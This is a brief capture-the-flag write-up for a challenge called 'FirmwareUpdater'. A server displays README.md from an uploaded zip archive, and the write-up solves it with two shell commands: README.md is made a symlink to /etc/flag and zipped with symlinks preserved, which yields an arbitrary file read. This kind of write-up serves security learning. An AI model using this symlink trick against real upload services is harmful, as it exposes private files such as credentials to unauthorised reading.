# FirmwareUpdater

The server displays content of README.md file from unpacked zip archive.

Solution is to send symlink in zip:
```sh
ln -s /etc/flag README.md
zip --symlinks test.zip README.md
```
